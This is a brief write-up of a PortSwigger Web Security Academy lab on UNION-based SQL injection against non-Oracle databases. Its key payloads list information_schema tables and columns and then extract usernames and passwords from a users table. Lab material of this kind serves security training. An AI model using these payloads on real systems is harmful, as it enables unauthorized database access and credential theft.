## SQL injection attack, listing the database contents on non-Oracle databases

**Category:** sqli
**Difficulty:** Unknown

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

### Solution Steps
You can find some useful payloads on our
SQL injection cheat sheet
.

### Key Payloads
- `administrator`
- `category`
- `'+UNION+SELECT+'abc','def'--`
- `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
- `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
- `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: sqli

---
*Source: PortSwigger Web Security Academy*
